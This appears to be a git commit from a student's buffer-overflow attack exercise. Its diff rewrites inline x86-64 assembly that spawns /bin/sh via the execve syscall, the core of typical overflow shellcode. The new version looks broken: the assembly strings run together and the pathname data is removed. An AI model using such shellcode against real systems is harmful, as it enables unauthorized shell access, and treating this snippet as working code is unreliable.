dc181cf23494d424aad3c358736746b9a656ee39
zechengh <zcheustc@gmail.com>
2021-03-19 13:49:52 -0400

    c

--- ad/attack/bufferoverflow/c_test_shell.c
+++ ad/attack/bufferoverflow/c_test_shell.c
@@ -10,23 +10,18 @@
 
 int main(int argc, char **argv)
 {
-    __asm__("
-        movq    $file_to_run, %rcx
-        movq    $59, %rax                /* syscall arg 1: syscall number execve(59) */
-        movq    %rcx, %rdi               /* syscall arg 2: string pathname */
-        leaq    8(%rcx), %rsi            /* syscall arg 2: argv ptr to ['/bin/sh']*/
-        movq    $0, %rdx                 /* syscall arg 4: envp (NULL) */
-        syscall                          /* Call execve("/bin/sh", ["/bin/sh"], []) */
+    __asm__(
+        "movq    $1, %rcx"
+        "movq    $59, %rax"                /* syscall arg 1: syscall number execve(59) */
+        "movq    %rcx, %rdi"               /* syscall arg 2: string pathname */
+        "leaq    8(%rcx), %rsi"            /* syscall arg 2: argv ptr to ['/bin/sh']*/
+        "movq    $0, %rdx"                 /* syscall arg 4: envp (NULL) */
+        "syscall"                          /* Call execve("/bin/sh", ["/bin/sh"], []) */
 
-        movq    $60, %rax                /* syscall arg 1: SYS_exit (60) */
-        xorq    %rdi,%rdi                /* syscall arg 2: 0 */
-        syscall                          /* invoke syscall */
-
-        file_to_run:
-            //.ascii  "/bin/sh\0"
-            .quad   file_to_run              /* Pointer to argv array.*/
-            .quad   0x0
-    ");
+        "movq    $60, %rax"                /* syscall arg 1: SYS_exit (60) */
+        "xorq    %rdi,%rdi"                /* syscall arg 2: 0 */
+        "syscall"                          /* invoke syscall */
+    );
 
     //execv("/bin/sh", NULL, NULL);
 }
